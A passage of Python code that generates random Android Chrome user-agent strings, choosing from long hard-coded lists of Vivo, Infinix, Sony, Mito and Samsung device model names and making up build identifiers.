'V2036A', 'V2099A', 'V2099A', 'V2160', 'V2160', 'V2160', 'V2066BA', 'V2066A', 'Y30g', 'Vivo Y30S', 'vivo Y31L', 'V2068', 'V2054A', 'V2068A', 'V2068', 'V2158A', 'Vivo Y32', 'V2180A', 'V2057', 'V2109', 'V2166A', 'V2166A', 'V2146', 'V2205', 'V2205', 'vivo Y37A', 'vivo Y37', 'V2044', 'vivo Y3t', 'vivo Y3t', 'vivo Y3t', 'vivo y41', 'vivo Y5 ', 'Vivo Y5', 'vivo 1935', 'VIVO Y50(2021)', 'V2023EA', 'Y50t', 'V2035', 'vivo Y51L', 'vivo Y51A', 'V2030', 'vivo 1707', 'V2031_21', 'vivo Y51t L', 'vivo Y51t L', 'vivo Y51t L', 'V2053', 'V2057A', 'vivo Y53', 'vivo 1606A', 'vivo Y53n', 'V2058', 'V2123A', 'V2069A', 'V2045A', 'V2045A', 'vivo Y55A', 'V2127', 'V2127', 'vivo 1603', 'vivo Y55n', 'vivo 1610', 'V2164A', 'V2164A', 'V1934A', 'V2006', 'vivo Y613', 'vivo Y613', 'vivo Y613F', 'vivo Y622', 'vivo Y622', 'vivo Y622', 'vivo Y622', 'vivo Y622', 'vivo Y623', 'vivo Y623', 'vivo Y627', 'vivo Y627', 'vivo Y627', 'vivo Y627', 'vivo Y628', 'vivo Y628', 'vivo 1719', 'vivo Y66', 'vivo Y66L', 'vivo Y66i A', 'vivo Y67', 'vivo Y67A', 'vivo Y67L', 'vivo Y685', 'vivo 1714', 'vivo Y69A', 'V2002A', 'V2002A', 'vivo Y71A', 'vivo 1724', 'vivo Y71A', 'vivo 1801', 'V2041', 'V2060', 'V2102A', 'V1731CA', 'vivo Y73', 'Vivo Y73 /MMB239M', 'V2059', 'V2031A', 'V2164PA', 'V2117', 'vivo Y75A', 'V2142', 'V2142', 'vivo Y75s', 'vivo Y75s', 'vivo Y75S', 'vivo Y75s', 'V2124', 'V2156A', 'V2219A', 'V2219A', 'V2169', 'V2169', 'V1913A', 'vivo 1808i', 'vivo 1803', 'vivo 1803', 'vivo 1812', 'vivo Y81S', 'V1732A', 'V1732T', 'vivo Y83A', 'vivo 1802', 'vivo Y83A', 'vivo Y83A', 'vivo 1726', 'Vivo Y83I', 'vivo Y85A', 'vivo Y85', 'Vivo Y85i', 'Vivo Y86', 'V1730EA', 'vivo v1730ea', 'vivo 1908', 'vivo 1823', 'vivo 1908_19', 'vivo 1817', 'vivo 1811', 'vivo Y913', 'vivo Y913', 'vivo Y91C', 'vivo 1820', 'vivo 1816', 'vivo Y923', 'vivo Y923', 'vivo Y927', 'vivo Y927', 'vivo Y928', 'vivo Y928', 'vivo Y928', 'vivo 1814', 'V1818A', 'V1818A', 'vivo 1814', 'vivo Y937', 'vivo Y937', 'vivo Y937', 'V1818CT', 'V1818CA', 'vivo 1807', 'vivo Y95', 'V1813A', 'V1813T', 'V1813A', 'vivo Y97', 'V1945A', 'V1801A0', 'vivo Z1', 'vivo 1918', 'vivo 1951', 'vivo 1951', 'VIVO Z1Pro', 'vivo 1918', 'vivo 1918 Flow', 'Vivo Z10', 'vivo Z1i', 'V1730DA', 'V1730DT', 'vivo Z1i', 'vivo_1951', 'vivo 1917', 'V1813BA', 'V1813BT', 'V1813BT', 'Vivo Z34', 'vivo Z3x', 'V1730GA', 'vivo Z3x', 'vivo Z3x', 'V1921A', 'V1911A', 'V1911A', 'V1911A', 'V1990A', 'V1990A', 'V1963A', 'V1963A'])
                self.build = (f"{random.choice(['TP1A', 'RP1A', 'QP1A', 'SP1A'])}.{random.randrange(210000, 220000)}.00{random.randrange(1, 9)}{random.choice(['; wv'])}")
                self.useragent = (f'Mozilla/5.0 (Linux; Android {self.android_version}; {self.android_model} Build/{self.build}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{self.browser_version} Mobile Safari/537.36')
            elif "Infinix" in str(self.device):
                self.android_model = random.choice(['Infinix F98', 'Infinix G636', 'Infinix X507', 'Infinix X507', 'Infinix Hot 10', 'Infinix X682B', 'Infinix X682C', 'Infinix X682B', 'Infinix X682C', 'MZ-Infinix X688C', 'Infinix X688B', 'Infinix X688C', 'Infinix X688B', 'Infinix X659B', 'Infinix PR652B', 'Infinix PR652B', 'Infinix X658E', 'Infinix PR652C', 'Infinix X689B', 'Infinix X689D', 'Infinix X689D', 'Infinix X689C', 'Infinix X662', 'Infinix X689F', 'MZ-Infinix X662B', 'Infinix X675', 'Infinix X675', 'Infinix X6812B', 'Infinix X6817', 'Infinix X6817B', 'Infinix X6816C', 'Infinix X6816', 'Infinix X6816D', 'Infinix X6816D', 'Infinix X668', 'Infinix X668C', 'Infinix X665B', 'Infinix X665', 'Infinix X665B', 'Infinix X510', 'Infinix X510', 'Infinix X6826B', 'Infinix X6826C', 'Infinix X6826B', 'Infinix X666B', 'Infinix X6825', 'Infinix X665E', 'Infinix X665C', 'Infinix X6827', 'Infinix X6827', 'Infinix HOT 3', 'Infinix HOT 3 LTE', 'Infinix-X554', 'Infinix HOT 3 Pro', 'Infinix X6831', 'Infinix X669', 'Infinix X669C', 'Infinix X669D', 'Infinix HOT 4', 'Infinix HOT 4 Lite', 'Infinix HOT 4 Pro', 'Infinix_X556_LTE', 'Infinix X559C', 'Infinix X559C', 'Infinix X559F', 'Infinix X559C', 'Infinix X606B', 'Infinix X606D', 'Infinix X606D', 'Infinix X606C', 'Infinix X608', 'Infinix X623', 'Infinix X624B', 'ar_AE Infinix X624', 'fr_FR Infinix X624', 'Infinix X625B', 'Infinix X625C', 'Infinix X625C', 'Infinix X625D', 'Infinix X650C', 'Infinix X650D', 'Infinix X650B', 'Infinix X650', 'Infinix X650C Flow', 'Infinix X650B', 'Infinix X650B', 'Infinix X650D', 'Infinix X655C', 'Infinix X655C', 'Infinix X655D', 'Infinix X680B', 'Infinix X655F', 'INFINIX-X551', 'Infinix-X551', 'Infinix-X551', 'INFINIX-X551', 'INFINIX-X551', 'Infinix_X521S', 'Infinix-X521', 'Infinix_X521_LTE', 'Infinix HOT S', 'Infinix-X521', 'Infinix_X521', 'Infinix X573', 'Infinix X573', 'Infinix X573B', 'Infinix X622', 'Infinix X622', 'Infinix Hot V3', 'Infinix HOT4 LTE', 'Infinix X693', 'Infinix X693', 'Infinix X695', 'Infinix X695C', 'Infinix X695D', 'MZ-Infinix X695C', 'Infinix X663', 'Infinix X663B', 'Infinix X697', 'Infinix X697', 'Infinix X698', 'Infinix X698', 'Infinix X670', 'Infinix X670', 'Infinix X676C', 'Infinix X663D', 'Infinix X676B', 'Infinix X671B', 'Infinix X672', 'Infinix X6819', 'Infinix X6819', 'Infinix X6819', 'Infinix X677', 'Infinix X677', 'Infinix-X600-LTE', 'Infinix NOTE 2', 'Infinix-X600-LTE', 'Infinix NOTE 2 LTE', 'Infinix NOTE 3', 'Infinix_X601_LTE', 'Infinix NOTE 3', 'Infinix NOTE 3 Pro', 'Infinix NOTE 3 Pro', 'Infinix X572', 'Infinix X572-LTE', 'Infinix X572', 'Infinix X572', 'Infinix X571', 'Infinix X604', 'Infinix X604B', 'Infinix X605', 'Infinix X610B', 'Infinix X610B', 'Infinix X610B', 'Infinix X690', 'Infinix X690B', 'Infinix X690B', 'Infinix X656', 'Infinix X656', 'Infinix X692', 'Infinix X692', 'Infinix X683B', 'Infinix X450', 'Infinix X5010', 'Infinix X5010', 'Infinix X401', 'Infinix S2', 'Infinix S2 Pro', 'Infinix S2 Pro', 'Infinix X626B', 'Infinix X626B', 'Infinix X626', 'Infinix X626B', 'Infinix X652A', 'Infinix X652', 'Infinix X652', 'Infinix X652A', 'Infinix X652A', 'Infinix X652B', 'Infinix X652C', 'Infinix X660C', 'Infinix X660C', 'Infinix X660B', 'Infinix X660C', 'Infinix X5515F', 'Infinix X5515I', 'Infinix X609', 'fr_MA Infinix X609', 'Infinix X5514D', 'Infinix X5516B', 'Infinix X5516C', 'Infinix X627', 'Infinix X627', 'Infinix X627', 'Infinix X653C', 'Infinix X680', 'Infinix X653', 'ar_AE Infinix X680', 'ar_AE Infinix X653', 'Infinix X680D', 'Infinix X657', 'Infinix X657B', 'Infinix X657C', 'Infinix X657', 'Infinix X657B', 'Infinix X6511', 'Infinix X6511B', 'Infinix X6511E', 'Infinix X6512', 'Infinix X6823', 'Infinix X6823C', 'Infinix X6823B', 'Infinix X6515', 'Infinix X6516', 'Infinix X6517', 'Infinix X612B', 'Infinix X503', 'Infinix X511', 'Infinix X352', 'Infinix X351', 'Infinix X351', 'Infinix X530', 'Infinix X530', 'Infinix X6711', 'Infinix X6716', 'Infinix X678B', 'Infinix Y88', 'Infinix X509', 'Infinix X6821', 'Infinix X6821', 'Infinix-X552', 'Infinix Zero 3', 'Infinix Zero 3', 'Infinix Zero 4', 'Infinix Zero 4 Plus', 'Infinix Zero 4 Plus', 'Infinix X603', 'Infinix X603-LTE', 'Infinix X6815C', 'Infinix X6815D', 'Infinix X6815B', 'Infinix X6815D', 'Infinix X6815C', 'Infinix X620B', 'Infinix X620', 'Infinix X620', 'Infinix X687', 'Infinix X687', 'Infinix X687', 'Infinix X687B', 'Infinix X6820', 'Infinix X6811B', 'Infinix X6811B', 'Infinix X6810', 'Infinix X6810'])
                self.build = (f"{random.choice(['SP1A'])}.{random.randrange(210000, 220000)}.00{random.randrange(1, 9)}{random.choice(['; wv'])}")
                self.useragent = (f'Mozilla/5.0 (Linux; Android {self.android_version}; {self.android_model} Build/{self.build}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{self.browser_version} Mobile Safari/537.36')
            elif "Sony" in str(self.device):
                self.android_model = random.choice(['BRAVIA 2015', 'BRAVIA 2K GB ATV3', 'BRAVIA 4K 2015', 'BRAVIA 4K GB', 'BRAVIA 4K GB ATV3', 'BRAVIA 4K UR2', 'BRAVIA 4K UR3', 'BRAVIA 4K VH2', 'BRAVIA VH1', 'BRAVIA VU1', 'Sony Experia 10', 'H4433', 'SONY-M880', 'SGP412', 'SGP551', 'SmartWatch 3', 'Sony Tablet P', 'Sony Tablet P', 'Sony Tablet P', 'Sony Tablet P', 'Sony Tablet S', 'Sony Tablet S', 'Sony Tablet S', 'Sony Tablet S', 'Sony Tablet S', 'NW-A100Series', 'NW-Z1000Series', 'Sony Xperia', 'J9110', '802SO', 'SOV40', 'SO-51A', 'SOG01', 'XQ-AT51', 'XQ-AT42', 'SO51Aa', 'SO-51B', 'XQ-BC52', 'SOG03', 'XQ-BC72', 'XQ-CT72', 'XQ-CT54', 'SOG06', 'I4113', 'I3113', 'I4193', 'SO-41A', 'SOV43', 'A001SO', 'XQ-AU52', 'XQ-AT52', 'XQ-BT52', 'SOG04', 'A102SO', 'SO-52B', 'XQ-BT44', 'XQ-CC54', 'XQ-CC72', 'SO-52C', 'A202SO', 'I4293', 'I4213', 'SOV41', '901SO', 'SO-01M', 'J8210', 'J9210', 'SO-52A', 'SOG02', 'XQ-AS52', 'A002SO', 'XQ-AS72', 'XQ-BQ52', 'SO-53B', 'SOG05', 'XQ-BQ72', 'A103SO', 'XQ-CQ54', 'XQ-CQ72', 'SOV42', '902SO', 'J3273', 'SO-04E', 'SonySO-04E', 'Xperia A', 'SO-04F', 'SAMSUNG Xperia a369i', 'SO-04G', 'SO-04G', 'J3173', 'SO-41B', 'SOG08', 'SO-53C', 'A203SO', 'Xperia Active', 'Xperia Active', 'Xperia Active', 'Xperia Arc', 'Xperia Arc', 'Xperia Arc', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'Xperia Arc S', 'SonyEricssonSO-02C', 'SonyEricssonSO-02C', 'SonyEricssonSO-02C', 'SonyEricssonSO-02C', 'SonyEricssonSO-02C', 'SonyEricssonSO-02C', 'SonyEricssonSO-02C', 'SonyEricssonSO-03D', 'SonyEricssonSO-03D', 'SonyEricssonSO-03D', 'SonyEricssonSO-03D', 'SonyEricssonSO-03D', 'SonyEricssonSO-03D', 'SonyEricssonSO-03D', 'LT26w', 'LT26w', 'SO-01E', 'Sony Xperia B6376', 'XPERIA BEAST 3', 'Xperia Burst', 'S39h', 'C2304', 'C2305', 'C2304', 'C2305', 'D2533', 'D2502', 'E5306', 'E5303', 'E5303', 'E5353', 'E5333', 'E5363', 'E5333', 'Xperia C5', 'E5553', 'E5506', 'E5533', 'E5563', 'XPERIA CUSTOM XA8', 'C1505', 'C1505', 'C1504', 'SonyC1504', 'SonyC1505v', 'SonyC1505', 'SonyC1504', 'SonyC1505', 'SonyC1504', 'C1505', 'C1505', 'SonyC1505', 'SonyC1505', 'SonyC1505', 'C1604', 'SonyC1605', 'SonyC1604', 'C1605', 'C1605', 'SonyC1605', 'C1604', 'SonyC1605', 'D2005', 'D2004', 'SonyD2005', 'D2005', 'D2104', 'D2114', 'D2105', 'D2105', 'XPERIA E16i', 'D2203', 'D2202', 'D2243', 'D2206', 'Xperia E3 3G', 'E3 Dual', 'D2212', 'D2212', 'D2212', 'E2115', 'E2104', 'E2105', 'xperia e4 dual', 'E2003', 'E2053', 'E2006', 'E2043', 'E2033', 'E2033', 'F3311', 'F3313', 'Xperia F_v3 Ultra', 'SONY XPERIA G', 'SonyST27a', 'SonyST27i', 'ST27a', 'ST27i', 'ST27I', 'ru ST27i', 'SonyST27i', 'SonyEricssonST27i', 'ST27i', 'ST27i', 'SO-04D', 'SonySO-04D', 'Xperia H870', 'SonyLT28i', 'SonyLT28h', 'LT28h', 'SonyEricssonLT28at', 'SonyEricssonLT28h', 'LT28i', 'LT28h', 'SonyLT28h', 'Xperia ion', 'Xperia ion', 'SonyEricssonLT28i', 'SonyEricssonLT28i', 'SonyEricssonLT28h', 'SonyEricssonLT28i', 'SonyST26a', 'ST26a', 'SonyST26i-o', 'SonyST26i', 'ST26i', 'ST26i', 'Xperia J', 'SonyST26i', 'SonyST26i', 'SonyST26i', 'SonyST26i', 'SonyST26i', 'ST26i', 'C2105', 'C2105', 'C2105', 'C2105', 'C2105', 'G3311', 'G3311', 'G3313', 'G3312', 'ru G3312', 'H3311', 'H3321', 'H4311', 'I3312', 'I4312', 'XQ-AD52', 'C1905', 'C1904', 'C1905', 'SonyC1904', 'SonyC1905', 'C1905', 'C1905', 'C2004', 'C2005', 'D2303', 'D2306', 'D2303', 'Xperia M2 3G', 'D2406', 'D2403', 'D2302', 'XPERIA M2 HSPASS', 'E2303', 'E2333', 'E2306', 'E2363', 'E2312', 'E2312', 'E5603', 'E5606', 'E5653', 'E5633', 'E5663', 'Xperia Mini', 'Xperia Mini', 'Xperia Mini', 'Xperia Mini', 'Xperia Mini', 'Xperia Mini Pro', 'Xperia Mini Pro', 'Xperia Mini Pro', 'Xperia Mini Pro', 'Xperia Mini Pro', 'Xperia mini pro', 'ST23i', 'SonyST23iv', 'SonyST23a', 'ST23i', 'SonyST23i', 'ST23i', 'ST23i', 'ST23i', 'SonyST23i', 'SonyST23i', 'SonyST23i', 'Xperia Neo', 'Xperia Neo', 'Xperia Neo', 'Xperia Neo', 'Xperia Neo', 'Xperia Neo L', 'Xperia Neo V', 'Xperia Neo V', 'Sony Xperia Neo V', 'Xperia Neo V', 'Xperia Neo V', 'Xperia Neo V', 'Xperia Neo V', 'Xperia Neo V', 'Xperia Neo V', 'Xperia Neo V', 'SO-02D', 'Xperia P', 'SonyLT22i', 'LT22i', 'SonyEricssonLT22i', 'SonyEricssonLT22i-o', 'LT22i', 'LT22i', 'LT22i', 'SonyEricssonLT22i-o', 'SonyLT22i', 'XQ-AQ52', 'XQ-AQ62', 'XQ-BE52', 'XQ-BE62', 'XQ-BE72', 'G2299', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Xperia Ray', 'Sony Xperia RC', 'Sony Xperia RC', 'SonyLT26iv', 'LT26i', 'SonyEricssonLT26i-o', 'SonyEricssonLT26i', 'LT26i', 'Xperia S', 'LT26i', 'SonyEricssonLT26i', 'Xperia S', 'Xperia S', 'Xperia S', 'SonyLT26i', 'LT26ii', 'ru LT26ii', 'LT26ii', 'LT26ii', 'Xperia Sola', 'Xperia Sola', 'C5303', 'C5302', 'C5306', 'SonyC5303', 'SonyC5306', 'C5303', 'Xperia SP', 'SO-05D', 'LT30p', 'SonyLT30p-o', 'LT30p', 'SonyLT30p', 'LT30p', 'LT30a', 'SonyLT30a', 'D5303', 'D5306', 'D5316', 'XM50h', 'XM50t', 'D5303', 'D5322', 'Xperia T3', 'D5103', 'D5102', 'D5106', 'D5103', 'Xperia Tab', 'SGPT12', 'Xperia Tablet S', 'SGPT13', 'SGPT13', 'SGPT12', 'SGP311', 'SGP321', 'SGP312', 'SGP512', 'SGP511', 'SGP521', 'SGP621', 'SGP611', 'SGP712', 'SonyST21i', 'SonyST21i', 'SonyST21i-o', 'ST21i', 'ST21a', 'ST21i', 'SonyST21a', 'SonyST21i', 'SonyST21i', 'SonyST21i', 'SonyST21i', 'SonyST21i', 'SonyST21i', 'SonyST21a', 'SonyST21i', 'SonyST21a', 'ST21i2', 'SonyST21a2', 'SonyST21i2', 'SonyST21i2', 'SonyST21i2', 'ru ST21i2', 'SonyST21i2', 'ST21i2', 'LT29i', 'Xperia TX', 'SonyST25i', 'ST25a', 'ST25i', 'ST25a', 'SonyEricssonST25i', 'ST25i', 'ru ST25i', 'ST25i', 'SonyEricssonST25i', 'SonyEricssonST25i', 'SonyEricssonST25i', 'SOL22', 'SOL22', 'SonySOL22', 'Xperia UL', 'Xperia V', 'SonyLT25i', 'Sony Xperia V', 'SonyLT25i', 'SonySOL21', 'F5121', 'F5321', 'SO-02J', 'F5122', '502SO', 'F8131', 'SO-04H', 'SOV33', 'F8132', 'Xperia X10', 'Xperia X10', 'Xperia X10', 'Xperia X10', 'Xperia x10 Mini Pro', 'Xperia X42', 'Xperia X8', 'XPERIA X8', 'Xperia X8', 'XPERIA X8', 'XPERIA X8', 'Xperia X8', 'Xperia X8', 'Xperia X8', 'XPERIA X8', 'F3111', 'F3115', 'Xperia XA 4', 'F3112', 'F3116', 'F3211', 'F3215', 'F3216', 'F3212', 'G3112', 'G3116', 'G3121', 'G3416', 'G3412', 'G3421', 'G3426', 'G3426', 'G3221', 'G3223', 'G3226', 'G3212', 'Xperia XA1 Unlocked', 'H3113', 'H4113', 'H4133', 'H4413', 'H4493', 'H3413', 'Xperia XA2 Plus Dual (AOSP)', 'H4213', 'H3213', 'H3223', 'H4233', 'Xperia XR', 'Xperia XR', '601SO', 'F8331', 'F8332', 'SO-01J', 'G8142', 'G8141', 'SO-04J', 'SO-04K', 'Xperia XZ Premium Dual (AOSP)', 'SO-01K', 'G8341', 'G8342', 'G8343', 'Xperia XZ1 (AOSPA)', 'G8441', 'SO-02K', 'Xperia XZ1 Dual', 'Xperia XZ1 Dual (AOSP)', 'SO-03K', 'H8324', 'SOV37', '702SO', 'H8216', 'SOV37', 'SO-05K', 'SO-05K', 'H8266', 'SOV38', 'H8116', 'H8166', 'H8416', '801SO', 'SO-01L', 'H9436', 'H9493', 'Xperia XZ3 Dual (AOSP)', 'Xperia XZ4', '602SO', 'G8231', 'G8232', 'SOV35', 'SOV35', 'C6603', 'C6602', 'C6833', 'C6802', 'SonySOL24', 'C6903', 'C6902', 'SO-02F', 'C6943', 'D5503', 'Xperia Z1s', 'Xperia Z1s', 'xperia z1s', 'D6503', 'D6503', 'D6503', 'SO-03F', 'SGP561', 'SOT21', 'Xperia Z2 Tablet WiFi', 'D6563', 'xperia z2a', 'D6653', 'D6603', 'SO-01G', 'SOL26', 'D6643', 'D5803', 'SO-02G', 'D5833', 'D6633', 'D6633', 'E6533', 'E6553', 'E6533', 'Xperia Z3C', 'Xperia z3Dual', 'Xperia z3tc', 'D6708', 'SOV31', 'SGP771', 'SO-03G', '402SO', 'Xperia Z4 Tablet', 'Xperia Z4 Tablet Wifi', 'Xperia Z4 Xtreme', 'xperia z4v', 'moto e22', '501SO', 'E6653', 'SO-01H', 'E6603', 'SO-02H', 'E5823', 'E5803', 'E5823', 'E6633', 'E6683', 'E6853', 'SO-03H', 'E6883', 'E6833', 'Xperia Z5P', 'Xperia Z7', 'C6502', 'C6506', 'C6503', 'SonyC6506', 'C6503', 'SOL25', 'Xperia ZQ', 'C5503', 'C5502'])
                self.build = (f"{random.randrange(61, 64)}.1.{random.choice(['A', 'F'])}.0.{random.randrange(188, 888)}{random.choice(['; wv'])}")
                self.useragent = (f'Mozilla/5.0 (Linux; Android {self.android_version}; {self.android_model} Build/{self.build}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{self.browser_version} Mobile Safari/537.36')
            elif "Mito" in str(self.device):
                self.android_model = random.choice(['MITO A230', 'Mito A67', 'MITO_A37_Z1', 'MITO A355', 'MITO_T7', 'MITO_A36_W1'])
                self.build = (f"{random.choice(['OPM2'])}.{random.randrange(0000000, 999999)}.00{random.randrange(1, 9)}{random.choice(['; wv'])}")
                self.useragent = (f'Mozilla/5.0 (Linux; Android {self.android_version}; {self.android_model} Build/{self.build}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{self.browser_version} Mobile Safari/537.36')
            elif "Samsung" in str(self.device):
                self.android_model = random.choice(['samsung 19A', 'samsung a1', 'Samsung A10', 'Samsung A20', 'samsung A21', 'Samsung A33', 'Samsung A4', 'samsung A5', 'Samsung A50', 'Samsung A51', 'Samsung A52s', 'samsung A56', 'Samsung A7', 'samsung A7', 'Samsung A70', 'SAMSUNG A800F', 'SM-W750V', 'Trident/7.0', 'Trident/7.0', 'Samsung Chrome 11 (3180)', 'Samsung Chromebook Pro', 'Samsung Chromebook 3', 'Samsung Chromebook Plus (V2)', 'SAMSUNG F12', 'Samsung F41', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800D', 'GT-I5800', 'GT-I5800', 'SAMSUNG SM-A716S', 'SM-A015F', 'SM-A015M', 'SM-A013M', 'SM-A013F', 'SM-A013G', 'SM-A022F', 'SM-A022M', 'SM-S124DL', 'SM-A025V', 'SM-A025G', 'SM-A025F', 'SM-A025U', 'SM-A025M', 'SM-A025F', 'SAMSUNG SM-A035G', 'SM-A035M', 'SM-A035F', 'SAMSUNG SM-A035M', 'SM-A032F', 'SM-A032M', 'SM-A037U', 'SM-A037U1', 'SM-S134DL', 'SAMSUNG SM-A037F', 'SM-A037M', 'SM-A045M', 'SM-A045F', 'SAMSUNG SM-A045F', 'SM-A042F', 'SM-A042M', 'SAMSUNG SM-A042F', 'SM-A047F', 'SAMSUNG SM-A047F', 'SM-A105FN', 'SAMSUNG SM-A105FN', 'SM-A105G', 'SM-A105M', 'U', 'SM-S102DL', 'SM-A102U', 'SAMSUNG SM-A102U', 'SAMSUNG SM-A102U1', 'SM-A107M', 'SM-A107F', 'SM-A107F', 'SM-A115F', 'SM-S115DL', 'SM-A115M', 'SM-A115F', 'SAMSUNG SM-A125F', 'SM-A127F', 'SM-A125U', 'SM-A137F', 'SM-A135F', 'SM-A135U1', 'SAMSUNG SM-A135F', 'SAMSUNG SM-A137F', 'SM-A135M', 'SM-A136U', 'SM-S136DL', 'SM-A136W', 'SM-A136B', 'SM-A145R', 'SAMSUNG SM-A145R/A145RXXU1AWD1', 'SM-A145F', 'SM-A145P', 'SAMSUNG SM-A145F', 'SM-A146U', 'SM-A146P', 'SM-A146U1', 'SAMSUNG SM-A146U', 'SM-A260G', 'SM-A260F', 'SM-A260F', 'SM-A205U', 'SAMSUNG SM-A205U1', 'SM-A205F', 'SM-A205W', 'SM-A205G', 'SM-S205DL', 'SM-A205GN', 'SM-A202F', 'SAMSUNG SM-A202F', 'SM-A207F', 'SM-A207M', 'SM-S215DL', 'SM-A215U1', 'SAMSUNG SM-S215DL', 'SM-A102J', '720x1448', 'SC-42A', 'SM-A217F', 'SAMSUNG SM-A217F', 'SM-A217M', 'U', 'SM-A225F', 'SM-A225M', 'SAMSUNG SM-A225F', 'SAMSUNG SM-A226B', 'SM-A226BR', 'SM-A235F', 'SM-A235N', 'SM-A236B', 'SM-A236E', 'SM-A236U', 'SAMSUNG SM-A236M', 'SAMSUNG SM-A236U1', 'SM-A236V', 'SM-A245F', 'SAMSUNG SM-A245F', 'SM-A245M', 'Samsung Galaxy A24', 'SM-A300FU', 'SM-A300H', 'SM-A310F', 'SAMSUNG SM-A310F', 'SM-A310F', 'SM-A310M', 'SM-A320F', 'SM-A320FL', 'SAMSUNG SM-A320FL', 'SM-A305FN', 'SM-A305GN', 'SM-A305N', 'SM-A305GT', 'Flow', 'SM-A307FN', 'SM-A307GT', 'SM-A307GN', 'SM-A315G', 'SM-A315F', 'SM-A315N', 'SM-A325F', 'SM-A325M', 'SAMSUNG SM-A325F', 'SM-A326W', 'SM-A326U', 'SM-A326B', 'SAMSUNG SM-A326B', 'SM-S326DL', 'SM-A336B', 'SAMSUNG SM-A336E', 'SM-A336M', 'SM-A336N', 'SM-A346B', 'SM-A346M', 'SAMSUNG SM-A346M', 'SM-A3460', 'SM-A346E', 'SAMSUNG SM-A346B/A346BXXU1AWB9', 'SAMSUNG SM-A346E', 'SAMSUNG SM-A430F', 'SM-A405FN', 'SAMSUNG SM-A405FN', 'SM-A405FN', 'SM-A405FN/DS', 'SM-A405S', 'SM-A3050', 'SM-A3051', 'SM-A3058', 'SM-A415F', 'SC-41A', 'SM-A4260', 'SM-A426U', 'SM-A426U1', 'SM-A426U', 'SM-A426B', 'SAMSUNG SM-A426B/A426BXXU4DVL3', 'SM-A426N', 'SAMSUNG SM-A426U', 'SM-A5009', 'SM-A500YZ', 'SM-A500W', 'SM-A500L', 'SAMSUNG SM-A500W', 'SAMSUNG SM-A500L', 'SM-A500X', 'SM-A500XZ', 'SM-A500XZ', 'SM-A500XZ', 'SM-A510F', 'SAMSUNG SM-A510F', 'SM-A510F', 'SM-A520F', 'SAMSUNG SM-A520F', 'SM-A520K', 'SM-A500M', 'SM-A500H', 'SM-A500F', 'SM-A500F', 'SM-A500FU', 'SM-A505FN', 'SM-A505G', 'SM-A505FM', 'SM-A505U', 'SM-A507FN', 'SM-A515F', 'SM-A515F', 'SM-A515U', 'SM-A516U', 'SM-A516B', 'SM-A516B/DS', 'SM-A516N', 'SC-54A', 'SM-A516V', 'SCG07', 'SM-A525F', 'SAMSUNG SM-A525F', 'SM-A525M', 'SAMSUNG SM-A526B', 'SM-A526W', 'SM-A526U', 'SM-A5260', 'SM-A528B', 'SAMSUNG SM-A528B', 'SAMSUNG SM-A528B/A528BXXU3EWE1', 'SM-A536E', 'SM-A536B', 'SAMSUNG SM-A536E', 'SM-A5360', 'SM-A536U', 'SM-A536U1', 'SM-A536V', 'SAMSUNG SM-A536V', 'SM-A546U1', 'SM-A546E', 'SM-A546B', 'SM-A5460', 'SAMSUNG SM-A546U', 'SM-A546W', 'SM-A546V', 'SAMSUNG SM-A600FN', 'SM-A600G', 'SM-A605FN', 'SM-A605G', 'SM-A6050', 'SM-A605GN/DS', 'SAMSUNG SM-A605FN', 'SM-A6060', 'SM-A606Y', 'SAMSUNG SM-A606Y', 'SM-G6200', 'SM-G6200', 'SM-A7000', 'SM-A700FD', 'SM-A700K', 'SM-A700H', 'SM-A700YD', 'SM-A710F', 'SM-A7100', 'SM-A710K', 'SM-A710M', 'SM-A720F', 'SM-A750FN', 'SAMSUNG SM-A750FN', 'SM-A750N', 'SM-A750GN', 'SM-A705FN', 'SM-A705MN', 'SM-A705GM', 'SM-A705W', 'SM-A707F', 'SAMSUNG SM-A707F', 'SAMSUNG SM-A7070', 'SM-A715F', 'SM-A715W', 'SM-A715F', 'SM-A715F', 'SM-A716U', 'SM-A716U1', 'SAMSUNG SM-A716U', 'SM-A716V', 'SAMSUNG SM-A716U1', 'SM-A725F', 'SM-A725M', 'SAMSUNG SM-A725F', 'SAMSUNG SM-A736B', 'SM-A736B', 'SM-A530F', 'SAMSUNG SM-A530F', 'SM-A8000', 'SM-A810F', 'SM-A810YZ', 'SAMSUNG SM-A810YZ', 'SM-A810S', 'SM-A530N', 'SM-A530W', 'SAMSUNG SM-A530W', 'SAMSUNG SM-G885F', 'SM-G885Y', 'SAMSUNG SM-G885S', 'SAMSUNG SM-G885Y', 'samsung SM-G885F', 'SM-A730F', 'SM-A805F', 'SAMSUNG SM-A805F', 'SM-A8050', 'SM-A805N', 'SM-G8870', 'SM-G887F', 'SM-A8s', 'SAMSUNG SM-G8870', 'SM-A9000', 'SM-A920F', 'SAMSUNG SM-A920F/A920FXXS7CVI7', 'U', 'SM-A910F', 'SM-G887N', 'SM-G887N', 'SM-A910F', 'SM-A9100', 'SM-G8850', 'SAMSUNG SM-G8850', 'SM-G8858', 'SM-G8850', 'SAMSUNG SM-A908B', 'SM-A908N', 'SAMSUNG SM-A908B/A908BXXU5EVK3', 'SAMSUNG SM-A908B/A908BXXU5EVG6', 'SAMSUNG SM-A9080', 'SM-A9080', 'GT-S5830', 'GT-S5830', 'GT-S5830', 'GT-S5830', 'GT-S5830', 'GT-S5830', 'GT-S5830M', 'GT-S5830i', 'GT-S5830i', 'GT-S5830L', 'GT-S5830G', 'GT-S5830M', 'GT-S5830M', 'GT-S5830C', 'GT-S5830V', 'GT-I8160', 'GT-I8160', 'GT-I8160', 'GT-I8160P', 'GT-I8160', 'GT-I8160P-ORANGE/I8160PBVLK3', 'GT-I8160', 'GT-I8160', 'GT-I8160', 'SAMSUNG GT-I8160/I8160BOLK2', 